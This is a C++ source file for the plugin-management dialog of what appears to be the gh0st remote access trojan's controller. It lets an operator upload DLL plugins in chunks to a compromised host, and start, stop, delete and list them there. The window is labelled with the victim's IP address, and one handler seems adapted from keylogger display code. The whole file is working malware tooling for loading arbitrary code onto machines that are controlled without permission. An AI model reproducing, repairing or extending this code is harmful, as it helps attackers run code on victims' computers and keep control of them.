// PluginDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "PluginDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CPluginDlg dialog

enum {TOKEN_DESCRIPT=10,TOKEN_RESULT,TOKEN_DELETE,TOKEN_STATR,TOKEN_END,TOKEN_REFURBISH};

CPluginDlg::CPluginDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CPluginDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CPluginDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_nCurSel = 0;
	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_PLUGIN));

	if(CGh0stApp::bUsePlugin==FALSE)
		ExitProcess(0);
}


void CPluginDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CPluginDlg)
	DDX_Control(pDX, IDC_PROGRESS1, m_Show);
	DDX_Control(pDX, IDC_LIST1, m_List);
	DDX_Control(pDX, IDC_EDIT, m_edit);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CPluginDlg, CDialog)
	//{{AFX_MSG_MAP(CPluginDlg)
	ON_WM_CLOSE()
	ON_WM_DROPFILES()
	ON_NOTIFY(NM_RCLICK, IDC_LIST1, OnRclickList1)
	ON_COMMAND(IDM_PLUGIN_DELETE, OnPluginDelete)
	ON_COMMAND(IDM_PLUGIN_END, OnPluginEnd)
	ON_COMMAND(IDM_PLUGIN_START, OnPluginStart)
	ON_COMMAND(IDM_REFURBISH, OnRefurbish)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPluginDlg message handlers


BOOL CPluginDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	m_nCurSel = m_edit.GetWindowTextLength();


	m_List.InsertColumn( 0, "已经安装插件", LVCFMT_LEFT, 100 );//插入列
	m_List.InsertColumn( 1, "功能描述", LVCFMT_LEFT, 270 );//插入列
	m_List.InsertColumn( 3, "状态", LVCFMT_LEFT, 60 );//插入列

	DWORD dwStyle = m_List.GetExtendedStyle();
	dwStyle |= LVS_EX_FULLROWSELECT;//选中某行使整行高亮（只适用与report风格的listctrl）
	dwStyle |= LVS_EX_GRIDLINES;//网格线（只适用与report风格的listctrl）
    m_List.SetExtendedStyle(dwStyle); //设置扩展风格
	
	m_Show.SetRange32(1,100);

	m_Show.SetPos(1);


	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - 插件管理", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);

	m_edit.SetLimitText(MAXDWORD); // 设置最大长度

	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CPluginDlg::OnReceiveComplete()
{	
	AddKeyBoardData();
	m_nReceiveLength = m_edit.GetWindowTextLength();
}

void CPluginDlg::AddKeyBoardData()
{
	// 最后填上0
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	
	CString strResult = m_pContext->m_DeCompressionBuffer.GetBuffer(0);

	if(strResult.GetAt(0) == TOKEN_DESCRIPT)
	{

		WORD iCount = m_List.GetItemCount();
		
		m_List.InsertItem(iCount,"",TRUE);
		//分解插件名称.
		char *p = strstr(strResult.GetBuffer(0)+1,"   ");
		if(p == NULL)
			return;

		CHAR PlugName[100]={NULL};

		strncpy(PlugName,strResult.GetBuffer(0)+1,strlen(strResult.GetBuffer(0)+1)-strlen(p));
		
		m_List.SetItemText(iCount,0,PlugName);

		p+=strlen("   ");


		char *d = strstr(p,"   ");

		if(d== NULL)
			return;

		CHAR PlugDesc[1024]={NULL};

		strncpy(PlugDesc,p,strlen(p)-strlen(d));

		m_List.SetItemText(iCount,1,PlugDesc);

		d+=strlen("   ");

		m_List.SetItemText(iCount,2,d);

		return;
	}

	
	strResult+="\r\n\r\n";

	SetDlgItemText(IDC_EDIT,strResult);

	int	len = m_edit.GetWindowTextLength();
	m_edit.SetSel(len, len);
	m_nCurSel = m_edit.GetWindowTextLength();
}

void CPluginDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);	
	CDialog::OnClose();
}

struct SENDFILE
{
	DWORD offset; //文件偏移
	DWORD nSize;  //缓冲区大小
	CHAR szFileName[MAX_PATH];//文件名称
	CHAR szBuffer[1024]; //数据大小.
};


BOOL OnReadFile(CHAR * lpData,DWORD Size,LPSTR lpPath,DWORD Offset=NULL)
{
	HANDLE m_hFile = CreateFile(lpPath,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	
	if(m_hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	
	SetFilePointer(m_hFile,Offset,NULL,FILE_BEGIN);
	
	DWORD iCount = 0;
	DWORD ReadBytes = 0;
	DWORD bResult;
	do 
	{
		bResult = ReadFile(m_hFile,&lpData[iCount],Size-iCount,&ReadBytes,NULL);
		
		//END File.
		if(bResult && ReadBytes == 0)
			break;

		iCount+=ReadBytes;
	} while (iCount < Size);
	
	CloseHandle(m_hFile);
	
	return iCount;
	
}

void CPluginDlg::SendFile()
{
	m_Show.SetPos(1);

	HANDLE m_hFile = CreateFile(szSendPath,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	
	if(m_hFile == INVALID_HANDLE_VALUE)
		return;

	DWORD FileSize = GetFileSize(m_hFile,NULL);

	CloseHandle(m_hFile);

	DWORD CountOffset = 0;

	SENDFILE Data={NULL};
	//得到文件名.
	CString szStr=szSendPath;
	szStr.MakeReverse();
	char *szFile = strstr(szStr.GetBuffer(0),"\\");
	strncpy(Data.szFileName,szStr.GetBuffer(0),strlen(szStr.GetBuffer(0))-strlen(szFile));

	do 
	{


		Data.offset = CountOffset;

		Data.nSize = OnReadFile(Data.szBuffer,1024,szSendPath,CountOffset);

		CountOffset+=Data.nSize;

		m_iocpServer->Send(m_pContext,(LPBYTE)&Data,sizeof(SENDFILE));

		m_Show.SetPos((CountOffset/FileSize)*100);

	} while (CountOffset < FileSize);

	//必要的Sleep..
	Sleep(1000);

	OnRefurbish();
}

DWORD WINAPI CPluginDlg::SendFileThread(LPVOID lParam)
{
	CPluginDlg *Point = (CPluginDlg*)lParam;
	Point->SendFile();

	return 0;
}

void CPluginDlg::OnDropFiles(HDROP hDropInfo) 
{
	// TODO: Add your message handler code here and/or call default
	
	int NameSize=DragQueryFile(hDropInfo,0,NULL,0);
	
	char pFile[MAX_PATH];
	ZeroMemory(pFile,MAX_PATH);
	DragQueryFile(hDropInfo,0,pFile,NameSize+1);
	
	
	//check PE File
	IMAGE_DOS_HEADER idh;
	if(OnReadFile((char *)&idh,sizeof(IMAGE_DOS_HEADER),pFile)==FALSE)
	{
		MessageBox("该文件无法读取 可能正在使用中!","警告",MB_OK|MB_ICONERROR);
		return;
	}
	
	if(idh.e_magic != IMAGE_DOS_SIGNATURE)
	{
		MessageBox("该文件并不是PE文件!无法校验DOS头!","警告",MB_OK|MB_ICONERROR);
		return;
	}
	
	IMAGE_NT_HEADERS inh;
	OnReadFile((char *)&inh,sizeof(IMAGE_NT_HEADERS),pFile,idh.e_lfanew);
	
	if(inh.Signature !=  IMAGE_NT_SIGNATURE )
	{
		MessageBox("该文件并不是PE文件!无法校验PE头!","警告",MB_OK|MB_ICONERROR);
		return;
	}
	
	CString szStr = pFile;
	
	szStr.MakeLower();


	if(szStr.Find("dll",0) == -1)
	{
		MessageBox("该文件并不是dll文件!无法校验文件后缀!","警告",MB_OK|MB_ICONERROR);
		return;
	}
	CString str;
	for(int i=0; i<m_List.GetItemCount(); i++)
	{
		str = m_List.GetItemText(i,0);
		if(strstr(pFile,str.GetBuffer(0)))
		{
			MessageBox("该插件已经安装过...请勿安装两次!","警告",MB_OK|MB_ICONERROR);
			return;
		}
    }

	
	ZeroMemory(szSendPath,MAX_PATH);
	strcpy(szSendPath,pFile);
	
	CloseHandle(CreateThread(NULL,NULL,SendFileThread,this,NULL,NULL));

	CDialog::OnDropFiles(hDropInfo);
}

void CPluginDlg::OnRclickList1(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	
	CMenu menu;
	menu.LoadMenu(IDR_PLUGIN);
	CPoint point;
	GetCursorPos(&point);

	CString str;
	for(int i=0; i<m_List.GetItemCount(); i++)
	{
		if( m_List.GetItemState(i, LVIS_SELECTED) == LVIS_SELECTED )
			break;
    }
	
	str = m_List.GetItemText(i,2);

//	if(str == "未加载")
//		menu.EnableMenuItem(IDM_PLUGIN_END,MF_BYCOMMAND|MF_GRAYED|MF_DISABLED);
//	else
//		menu.EnableMenuItem(IDM_PLUGIN_START,MF_BYCOMMAND|MF_GRAYED|MF_DISABLED);
	
	menu.GetSubMenu(0)->TrackPopupMenu(TPM_RIGHTBUTTON,point.x,point.y,this,NULL);

	*pResult = 0;
}



void CPluginDlg::OnPluginDelete() 
{
	// TODO: Add your command handler code here
	BYTE bToken[MAX_PATH] = {NULL};
	bToken[0]=TOKEN_DELETE;
	
	CString str;
	for(int i=0; i<m_List.GetItemCount(); i++)
	{
		if( m_List.GetItemState(i, LVIS_SELECTED) == LVIS_SELECTED )
			break;
    }
	str = m_List.GetItemText(i,0);

	strcpy((char *)&bToken[1],str.GetBuffer(0));

	m_iocpServer->Send(m_pContext, bToken, strlen((char *)bToken));

	m_List.DeleteItem(i);

	//OnRefurbish();
}

void CPluginDlg::OnPluginEnd() 
{
	// TODO: Add your command handler code here
	BYTE bToken[MAX_PATH] = {NULL};
	bToken[0]=TOKEN_END;
	
	CString str;
	for(int i=0; i<m_List.GetItemCount(); i++)
	{
		if( m_List.GetItemState(i, LVIS_SELECTED) == LVIS_SELECTED )
			break;
    }
	str = m_List.GetItemText(i,0);
	
	strcpy((char *)&bToken[1],str.GetBuffer(0));
	
	m_iocpServer->Send(m_pContext, bToken, strlen((char *)bToken));

	//OnRefurbish();

}

void CPluginDlg::OnPluginStart() 
{
	// TODO: Add your command handler code here
	BYTE bToken[MAX_PATH] = {NULL};
	bToken[0]=TOKEN_STATR;
	
	CString str;
	for(int i=0; i<m_List.GetItemCount(); i++)
	{
		if( m_List.GetItemState(i, LVIS_SELECTED) == LVIS_SELECTED )
			break;
    }
	str = m_List.GetItemText(i,0);
	
	strcpy((char *)&bToken[1],str.GetBuffer(0));
	
	m_iocpServer->Send(m_pContext, bToken, strlen((char *)bToken));

	//OnRefurbish();
}

void CPluginDlg::OnRefurbish() 
{
	// TODO: Add your command handler code here
	m_List.DeleteAllItems();

	BYTE bToken = TOKEN_REFURBISH;

	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
}
